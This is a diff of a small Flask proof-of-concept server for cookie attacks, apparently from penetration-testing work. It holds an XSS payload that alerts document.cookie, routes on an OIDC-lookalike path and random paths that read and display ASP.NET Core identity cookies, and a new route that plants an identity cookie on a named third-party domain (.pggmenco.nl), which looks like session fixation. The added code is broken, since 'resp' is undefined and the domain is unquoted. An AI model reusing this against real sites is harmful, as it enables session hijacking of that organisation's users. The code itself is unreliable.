@@ -14,7 +14,7 @@ def hello_poc_sxss():
     return "<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html><!DOCTYPE html><title></title>"
 
 @app.route('/signin-oidc')
-def collect_cookies():
+def collect_cookies_2():
     _ga = request.cookies.get('_ga')
     _gid = request.cookies.get('_gid')
     C0 = request.cookies.get('.AspNetCore.Identity.Application')
@@ -30,13 +30,22 @@ def collect_cookies():
     f".AspNetCore.Correlation = {T1} \n\n"
 
 @app.route('/6w1ymvcfdrf33n7m2cc6')
-def collect_cookies_2():
+def collect_cookies():
     _ga = request.cookies.get('_ga')
     _gid = request.cookies.get('_gid')
-    C1 = request.cookies.get('.AspNetCore.Identity.ApplicationC1')
-    C2 = request.cookies.get('.AspNetCore.Identity.ApplicationC2')
     return f"Cookies to collect: \n\n" \
     f"_ga = {_ga} \n\n" \
-    f"_gid = {_gid} \n\n" \
-    f".AspNetCore.Identity.ApplicationC1 = {C1} \n\n" \
-    f".AspNetCore.Identity.ApplicationC2 = {C2} \n\n"
+    f"_gid = {_gid} \n\n"
+
+@app.route('/j1ne16xhwld4ir40x2af')
+def setcookies():
+	resp.set_cookie(
+    ".AspNetCore.Identity.ApplicationC1",
+    value="aaaa",
+    max_age=60,
+	path='/',
+    domain=.pggmenco.nl,
+    secure=True,
+    httponly=True,
+    samesite=None
+)
